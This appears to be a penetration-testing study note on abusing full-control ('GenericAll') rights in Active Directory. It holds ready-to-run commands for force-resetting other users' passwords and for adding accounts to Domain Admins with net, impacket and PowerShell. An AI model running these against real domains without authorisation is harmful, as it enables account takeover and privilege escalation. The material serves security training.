"Full Control" over the target object; can modify the attribute
You have full control over the target AD object, allowing you to modify its attributes and security permissions. The practical attack depends on the object type and which changes produce a useful access path.
#### **If target is a User:** 
1. Force reset their password.
- **Change the Target’s Password**: Using `net user <username> <password> /domain`, the attacker can reset the user’s password.
2. [[Targeted Kerberoasting]]
3. [[Shadow Credentials]]

### Change password
You are using Alice's GenericAll permission to reset Bob's password.

You can then authenticate as Bob.

Running cmd from a domain-joined Windows machine
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc password [targetUser] '[myNewPW]' -U '${discoveredDomain}/[adminUser]%[adminPW]' -S {DC Hostname}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
impacket-changepasswd -reset -protocol smb-samr \
'corp.local/bob@[ip]' -newpass 'NewPassword123!' -altuser 'corp.local/{AdminUser}' -altpass '{AdminPW}'
```
### Reset Password

Running cmd from a domain-joined Windows machine
```
net user [targetUser] "Pass123!" /domain
```
or
Run from powershell
```powershell
$SecPassword = ConvertTo-SecureString "Pass123!" -AsPlainText -Force

Set-ADAccountPassword -Identity "[targetUser]" -NewPassword $SecPassword -Reset
```

---
#### **If target is a Group:** Add yourself/any user to that group.
- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
1. Group Membership Modification
#### Add yourself

```
impacket-net 'corp.local/alice:Password123!@<DC_IP>' group -name 'Domain Admins' -join 'alice'
```

Running cmd from a domain-joined Windows machine
```
net group "Domain Admins" alice /add /domain
```
#### Add another user
```
impacket-net 'corp.local/alice:Password123!@<DC_IP>' group -name 'TargetGroup' -join 'bob'
```
#### Verify Membership
```
impacket-net 'corp.local/alice:Password123!@<DC_IP>' group -name 'TargetGroup'
```
---
#### **If target is a Computer:**
1. [[Shadow Credentials]]
2. [[RBCD]]